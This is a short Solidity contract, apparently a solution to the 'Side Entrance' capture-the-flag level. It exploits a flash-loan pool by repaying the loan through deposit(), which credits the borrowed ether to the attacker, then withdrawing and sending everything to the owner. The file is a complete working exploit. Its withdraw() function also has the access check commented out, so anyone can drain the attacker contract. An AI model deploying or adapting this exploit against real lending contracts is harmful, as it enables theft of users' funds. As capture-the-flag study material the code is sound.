// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideEntranceAttacker {
    ISideEntranceLenderPool pool;
    address owner;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() public payable {
        require(msg.sender == address(pool), "Not the LenderPool");
        uint256 contractEth = address(this).balance;
        //return the loan but also increase your stake in the pool
        pool.deposit{value: contractEth}();
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function getPoolEth() external {
        pool.withdraw();
    }

    function withdraw() external {
        //require(owner == msg.sender, "Not Onwner");
        uint256 amount = address(this).balance;
        (bool sent, ) = payable(owner).call{value: amount}("");
        require(sent, "Withdrawal failed");
    }

    receive() external payable {}

    fallback() external payable {}
}
